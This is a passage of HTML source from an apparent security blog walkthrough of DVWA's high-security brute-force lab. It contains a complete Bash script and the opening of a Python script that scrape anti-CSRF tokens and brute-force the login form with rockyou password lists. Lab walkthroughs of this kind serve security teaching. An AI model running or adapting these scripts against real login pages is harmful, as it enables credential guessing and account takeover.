&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Hydra Attack Results" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-41.png" /&gt;&lt;/p&gt;

&lt;p&gt;Note, we do not see the result of the macro being used. We are only seeing the values before Burp alters the traffic, which is why the &lt;code&gt;user_token&lt;/code&gt; appears to be an incorrect value each time. The attack was successful, which can be seen in Burp by the &lt;code&gt;length&lt;/code&gt; column, and response tab, as well as in Hydra's output window.&lt;/p&gt;

&lt;p&gt;Also note, the speed of the traffic in Burp's proxy is not filtered, unlike Burp's intruder function when using the free license.&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Proof.of.Concept.Scripts"&gt;&lt;/a&gt;
&lt;h2&gt;Proof of Concept Scripts&lt;/h2&gt;

&lt;p&gt;Here are two Proof of Concept (PoC) scripts (one in &lt;a href="https://github.com/g0tmi1k/boot2root-scripts/blob/master/dvwa-bruteforce-high-http-get.sh"&gt;Bash&lt;/a&gt; and the other is &lt;a href="https://github.com/g0tmi1k/boot2root-scripts/blob/master/dvwa-bruteforce-high-http-get.py"&gt;Python&lt;/a&gt;). They are really rough templates, and not stable tools to be keep on using. They are not meant to be "fancy" (e.g. no timeouts or no multi-threading). However, they can be fully customised in the attack. We cannot benchmark these, because of the random cool down times when there is a failed login attempt.&lt;/p&gt;

&lt;p&gt;These scripts (can more) can be found on &lt;a href="https://github.com/g0tmi1k/boot2root-scripts/"&gt;GitHub at the following repository&lt;/a&gt;.&lt;/p&gt;

&lt;a name="Bash.Template"&gt;&lt;/a&gt;
&lt;h3&gt;Bash Template&lt;/h3&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;span class="line-number"&gt;32&lt;/span&gt;
&lt;span class="line-number"&gt;33&lt;/span&gt;
&lt;span class="line-number"&gt;34&lt;/span&gt;
&lt;span class="line-number"&gt;35&lt;/span&gt;
&lt;span class="line-number"&gt;36&lt;/span&gt;
&lt;span class="line-number"&gt;37&lt;/span&gt;
&lt;span class="line-number"&gt;38&lt;/span&gt;
&lt;span class="line-number"&gt;39&lt;/span&gt;
&lt;span class="line-number"&gt;40&lt;/span&gt;
&lt;span class="line-number"&gt;41&lt;/span&gt;
&lt;span class="line-number"&gt;42&lt;/span&gt;
&lt;span class="line-number"&gt;43&lt;/span&gt;
&lt;span class="line-number"&gt;44&lt;/span&gt;
&lt;span class="line-number"&gt;45&lt;/span&gt;
&lt;span class="line-number"&gt;46&lt;/span&gt;
&lt;span class="line-number"&gt;47&lt;/span&gt;
&lt;span class="line-number"&gt;48&lt;/span&gt;
&lt;span class="line-number"&gt;49&lt;/span&gt;
&lt;span class="line-number"&gt;50&lt;/span&gt;
&lt;span class="line-number"&gt;51&lt;/span&gt;
&lt;span class="line-number"&gt;52&lt;/span&gt;
&lt;span class="line-number"&gt;53&lt;/span&gt;
&lt;span class="line-number"&gt;54&lt;/span&gt;
&lt;span class="line-number"&gt;55&lt;/span&gt;
&lt;span class="line-number"&gt;56&lt;/span&gt;
&lt;span class="line-number"&gt;57&lt;/span&gt;
&lt;span class="line-number"&gt;58&lt;/span&gt;
&lt;span class="line-number"&gt;59&lt;/span&gt;
&lt;span class="line-number"&gt;60&lt;/span&gt;
&lt;span class="line-number"&gt;61&lt;/span&gt;
&lt;span class="line-number"&gt;62&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#!/bin/bash&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Quick PoC template for HTTP GET form brute force with CSRF token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Target: DVWA v1.10 (Brute Force - High)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#   Date: 2015-11-07&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Author: g0tmi1k ~ https://blog.g0tmi1k.com/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Source: https://blog.g0tmi1k.com/dvwa/bruteforce-high/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;## Variables&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;URL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.44/DVWA&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;DVWA_USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;DVWA_PASS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;USER_LIST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/share/seclists/Usernames/top_shortlist.txt&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;PASS_LIST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/share/seclists/Passwords/rockyou.txt&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;## Value to look for in response (Whitelisting)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;SUCCESS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Welcome to the password protected area&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;## Anti CSRF token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;CSRF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;$( curl -s -c /tmp/dvwa.cookie &amp;quot;&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;URL&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;/login.php&lt;span class="s2"&gt;&amp;quot; | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;&lt;/span&gt;&lt;span class="s1"&gt;'&amp;quot; -f2 )&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;sed -i '&lt;/span&gt;/security/d&lt;span class="s1"&gt;' /tmp/dvwa.cookie&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;## Login to DVWA core&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;curl -s -b /tmp/dvwa.cookie -d &amp;quot;username=${DVWA_USER}&amp;amp;password=${DVWA_PASS}&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; &amp;quot;${URL}/login.php&amp;quot; &amp;gt;/dev/null&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;[[ &amp;quot;$?&amp;quot; -ne 0 ]] &amp;amp;&amp;amp; echo -e '&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;!&lt;span class="o"&gt;]&lt;/span&gt; Issue connecting! &lt;span class="c"&gt;#1' &amp;amp;&amp;amp; exit 1&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;## Counter&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;## Password loop&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="nb"&gt;read&lt;/span&gt; -r _PASS&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="c"&gt;## Username loop&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="nb"&gt;read&lt;/span&gt; -r _USER&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;## Increase counter&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;i+1&lt;span class="o"&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;## Feedback for user&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[i] Try ${i}: ${_USER} // ${_PASS}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;## CSRF token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="nv"&gt;USER_TOKEN&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;$( curl -s -b 'security=high' -b /tmp/dvwa.cookie &amp;quot;&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;URL&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;/vulnerabilities/brute/&lt;span class="s2"&gt;&amp;quot; | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;&lt;/span&gt;&lt;span class="s1"&gt;'&amp;quot; -f2 )&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;    ## Connect to server&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;    REQUEST=&amp;quot;$( curl -s -b '&lt;/span&gt;&lt;span class="nv"&gt;security&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;high&lt;span class="s1"&gt;' -b /tmp/dvwa.cookie &amp;quot;${URL}/vulnerabilities/brute/?username=${_USER}&amp;amp;password=${_PASS}&amp;amp;user_token=${USER_TOKEN}&amp;amp;Login=Login&amp;quot; )&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;    [[ $? -ne 0 ]] &amp;amp;&amp;amp; echo -e '&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;!&lt;span class="o"&gt;]&lt;/span&gt; Issue connecting! &lt;span class="c"&gt;#2'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;## Check response&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;${REQUEST}&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; grep -q &lt;span class="s2"&gt;&amp;quot;${SUCCESS}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;$?&amp;quot;&lt;/span&gt; -eq &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;      &lt;span class="c"&gt;## Success!&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;      &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;quot;\n\n[i] Found!&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;      &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[i] Username: ${_USER}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;      &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[i] Password: ${_PASS}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;      &lt;span class="nb"&gt;break &lt;/span&gt;2
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="k"&gt;done&lt;/span&gt; &amp;lt; &lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;USER_LIST&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;done&lt;/span&gt; &amp;lt; &lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;PASS_LIST&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;## Clean up&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;rm -f /tmp/dvwa.cookie
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;hr /&gt;

&lt;a name="Python.Template"&gt;&lt;/a&gt;
&lt;h3&gt;Python Template&lt;/h3&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;span class="line-number"&gt;32&lt;/span&gt;
&lt;span class="line-number"&gt;33&lt;/span&gt;
&lt;span class="line-number"&gt;34&lt;/span&gt;
&lt;span class="line-number"&gt;35&lt;/span&gt;
&lt;span class="line-number"&gt;36&lt;/span&gt;
&lt;span class="line-number"&gt;37&lt;/span&gt;
&lt;span class="line-number"&gt;38&lt;/span&gt;
&lt;span class="line-number"&gt;39&lt;/span&gt;
&lt;span class="line-number"&gt;40&lt;/span&gt;
&lt;span class="line-number"&gt;41&lt;/span&gt;
&lt;span class="line-number"&gt;42&lt;/span&gt;
&lt;span class="line-number"&gt;43&lt;/span&gt;
&lt;span class="line-number"&gt;44&lt;/span&gt;
&lt;span class="line-number"&gt;45&lt;/span&gt;
&lt;span class="line-number"&gt;46&lt;/span&gt;
&lt;span class="line-number"&gt;47&lt;/span&gt;
&lt;span class="line-number"&gt;48&lt;/span&gt;
&lt;span class="line-number"&gt;49&lt;/span&gt;
&lt;span class="line-number"&gt;50&lt;/span&gt;
&lt;span class="line-number"&gt;51&lt;/span&gt;
&lt;span class="line-number"&gt;52&lt;/span&gt;
&lt;span class="line-number"&gt;53&lt;/span&gt;
&lt;span class="line-number"&gt;54&lt;/span&gt;
&lt;span class="line-number"&gt;55&lt;/span&gt;
&lt;span class="line-number"&gt;56&lt;/span&gt;
&lt;span class="line-number"&gt;57&lt;/span&gt;
&lt;span class="line-number"&gt;58&lt;/span&gt;
&lt;span class="line-number"&gt;59&lt;/span&gt;
&lt;span class="line-number"&gt;60&lt;/span&gt;
&lt;span class="line-number"&gt;61&lt;/span&gt;
&lt;span class="line-number"&gt;62&lt;/span&gt;
&lt;span class="line-number"&gt;63&lt;/span&gt;
&lt;span class="line-number"&gt;64&lt;/span&gt;
&lt;span class="line-number"&gt;65&lt;/span&gt;
&lt;span class="line-number"&gt;66&lt;/span&gt;
&lt;span class="line-number"&gt;67&lt;/span&gt;
&lt;span class="line-number"&gt;68&lt;/span&gt;
&lt;span class="line-number"&gt;69&lt;/span&gt;
&lt;span class="line-number"&gt;70&lt;/span&gt;
&lt;span class="line-number"&gt;71&lt;/span&gt;
&lt;span class="line-number"&gt;72&lt;/span&gt;
&lt;span class="line-number"&gt;73&lt;/span&gt;
&lt;span class="line-number"&gt;74&lt;/span&gt;
&lt;span class="line-number"&gt;75&lt;/span&gt;
&lt;span class="line-number"&gt;76&lt;/span&gt;
&lt;span class="line-number"&gt;77&lt;/span&gt;
&lt;span class="line-number"&gt;78&lt;/span&gt;
&lt;span class="line-number"&gt;79&lt;/span&gt;
&lt;span class="line-number"&gt;80&lt;/span&gt;
&lt;span class="line-number"&gt;81&lt;/span&gt;
&lt;span class="line-number"&gt;82&lt;/span&gt;
&lt;span class="line-number"&gt;83&lt;/span&gt;
&lt;span class="line-number"&gt;84&lt;/span&gt;
&lt;span class="line-number"&gt;85&lt;/span&gt;
&lt;span class="line-number"&gt;86&lt;/span&gt;
&lt;span class="line-number"&gt;87&lt;/span&gt;
&lt;span class="line-number"&gt;88&lt;/span&gt;
&lt;span class="line-number"&gt;89&lt;/span&gt;
&lt;span class="line-number"&gt;90&lt;/span&gt;
&lt;span class="line-number"&gt;91&lt;/span&gt;
&lt;span class="line-number"&gt;92&lt;/span&gt;
&lt;span class="line-number"&gt;93&lt;/span&gt;
&lt;span class="line-number"&gt;94&lt;/span&gt;
&lt;span class="line-number"&gt;95&lt;/span&gt;
&lt;span class="line-number"&gt;96&lt;/span&gt;
&lt;span class="line-number"&gt;97&lt;/span&gt;
&lt;span class="line-number"&gt;98&lt;/span&gt;
&lt;span class="line-number"&gt;99&lt;/span&gt;
&lt;span class="line-number"&gt;100&lt;/span&gt;
&lt;span class="line-number"&gt;101&lt;/span&gt;
&lt;span class="line-number"&gt;102&lt;/span&gt;
&lt;span class="line-number"&gt;103&lt;/span&gt;
&lt;span class="line-number"&gt;104&lt;/span&gt;
&lt;span class="line-number"&gt;105&lt;/span&gt;
&lt;span class="line-number"&gt;106&lt;/span&gt;
&lt;span class="line-number"&gt;107&lt;/span&gt;
&lt;span class="line-number"&gt;108&lt;/span&gt;
&lt;span class="line-number"&gt;109&lt;/span&gt;
&lt;span class="line-number"&gt;110&lt;/span&gt;
&lt;span class="line-number"&gt;111&lt;/span&gt;
&lt;span class="line-number"&gt;112&lt;/span&gt;
&lt;span class="line-number"&gt;113&lt;/span&gt;
&lt;span class="line-number"&gt;114&lt;/span&gt;
&lt;span class="line-number"&gt;115&lt;/span&gt;
&lt;span class="line-number"&gt;116&lt;/span&gt;
&lt;span class="line-number"&gt;117&lt;/span&gt;
&lt;span class="line-number"&gt;118&lt;/span&gt;
&lt;span class="line-number"&gt;119&lt;/span&gt;
&lt;span class="line-number"&gt;120&lt;/span&gt;
&lt;span class="line-number"&gt;121&lt;/span&gt;
&lt;span class="line-number"&gt;122&lt;/span&gt;
&lt;span class="line-number"&gt;123&lt;/span&gt;
&lt;span class="line-number"&gt;124&lt;/span&gt;
&lt;span class="line-number"&gt;125&lt;/span&gt;
&lt;span class="line-number"&gt;126&lt;/span&gt;
&lt;span class="line-number"&gt;127&lt;/span&gt;
&lt;span class="line-number"&gt;128&lt;/span&gt;
&lt;span class="line-number"&gt;129&lt;/span&gt;
&lt;span class="line-number"&gt;130&lt;/span&gt;
&lt;span class="line-number"&gt;131&lt;/span&gt;
&lt;span class="line-number"&gt;132&lt;/span&gt;
&lt;span class="line-number"&gt;133&lt;/span&gt;
&lt;span class="line-number"&gt;134&lt;/span&gt;
&lt;span class="line-number"&gt;135&lt;/span&gt;
&lt;span class="line-number"&gt;136&lt;/span&gt;
&lt;span class="line-number"&gt;137&lt;/span&gt;
&lt;span class="line-number"&gt;138&lt;/span&gt;
&lt;span class="line-number"&gt;139&lt;/span&gt;
&lt;span class="line-number"&gt;140&lt;/span&gt;
&lt;span class="line-number"&gt;141&lt;/span&gt;
&lt;span class="line-number"&gt;142&lt;/span&gt;
&lt;span class="line-number"&gt;143&lt;/span&gt;
&lt;span class="line-number"&gt;144&lt;/span&gt;
&lt;span class="line-number"&gt;145&lt;/span&gt;
&lt;span class="line-number"&gt;146&lt;/span&gt;
&lt;span class="line-number"&gt;147&lt;/span&gt;
&lt;span class="line-number"&gt;148&lt;/span&gt;
&lt;span class="line-number"&gt;149&lt;/span&gt;
&lt;span class="line-number"&gt;150&lt;/span&gt;
&lt;span class="line-number"&gt;151&lt;/span&gt;
&lt;span class="line-number"&gt;152&lt;/span&gt;
&lt;span class="line-number"&gt;153&lt;/span&gt;
&lt;span class="line-number"&gt;154&lt;/span&gt;
&lt;span class="line-number"&gt;155&lt;/span&gt;
&lt;span class="line-number"&gt;156&lt;/span&gt;
&lt;span class="line-number"&gt;157&lt;/span&gt;
&lt;span class="line-number"&gt;158&lt;/span&gt;
&lt;span class="line-number"&gt;159&lt;/span&gt;
&lt;span class="line-number"&gt;160&lt;/span&gt;
&lt;span class="line-number"&gt;161&lt;/span&gt;
&lt;span class="line-number"&gt;162&lt;/span&gt;
&lt;span class="line-number"&gt;163&lt;/span&gt;
&lt;span class="line-number"&gt;164&lt;/span&gt;
&lt;span class="line-number"&gt;165&lt;/span&gt;
&lt;span class="line-number"&gt;166&lt;/span&gt;
&lt;span class="line-number"&gt;167&lt;/span&gt;
&lt;span class="line-number"&gt;168&lt;/span&gt;
&lt;span class="line-number"&gt;169&lt;/span&gt;
&lt;span class="line-number"&gt;170&lt;/span&gt;
&lt;span class="line-number"&gt;171&lt;/span&gt;
&lt;span class="line-number"&gt;172&lt;/span&gt;
&lt;span class="line-number"&gt;173&lt;/span&gt;
&lt;span class="line-number"&gt;174&lt;/span&gt;
&lt;span class="line-number"&gt;175&lt;/span&gt;
&lt;span class="line-number"&gt;176&lt;/span&gt;
&lt;span class="line-number"&gt;177&lt;/span&gt;
&lt;span class="line-number"&gt;178&lt;/span&gt;
&lt;span class="line-number"&gt;179&lt;/span&gt;
&lt;span class="line-number"&gt;180&lt;/span&gt;
&lt;span class="line-number"&gt;181&lt;/span&gt;
&lt;span class="line-number"&gt;182&lt;/span&gt;
&lt;span class="line-number"&gt;183&lt;/span&gt;
&lt;span class="line-number"&gt;184&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="python"&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#!/usr/bin/python&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Quick PoC template for HTTP GET form brute force with CSRF token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Target: DVWA v1.10 (Brute Force - High)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#   Date: 2015-11-07&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Author: g0tmi1k ~ https://blog.g0tmi1k.com/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Source: https://blog.g0tmi1k.com/dvwa/bruteforce-high/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;BeautifulSoup&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Variables&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;target&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'http://192.168.1.44/DVWA'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;sec_level&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'high'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;dvwa_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'admin'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;dvwa_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'password'&lt;/span&gt;
